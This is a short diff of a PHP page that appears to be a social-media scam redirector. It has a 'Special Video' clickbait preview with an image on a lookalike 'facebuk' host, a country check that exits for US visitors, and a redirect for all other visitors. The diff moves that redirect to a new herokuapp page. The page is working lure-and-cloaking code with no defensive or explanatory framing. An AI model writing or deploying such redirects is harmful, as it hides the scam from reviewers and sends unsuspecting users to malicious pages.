@@ -31,8 +31,7 @@
     }
 
     ?>
-<meta property="og:title" content="Special Video..<?php echo shkronja(8); ?>" />
-<meta property="og:image" content="https://facebuk1.herokuapp.com/<?php echo shkronja(8); ?>.jpg" />
+<meta property="og:image" content="https://google.com" />
 <?php
 
  
@@ -61,7 +60,7 @@ switch($country_code)
           case "US": exit(); break;
 
 
-              default: header("Location: https://s3.amazonaws.com/redi50/red.html");
+              default: header("Location: https://kompj2.herokuapp.com/1.php");
 }
 
 
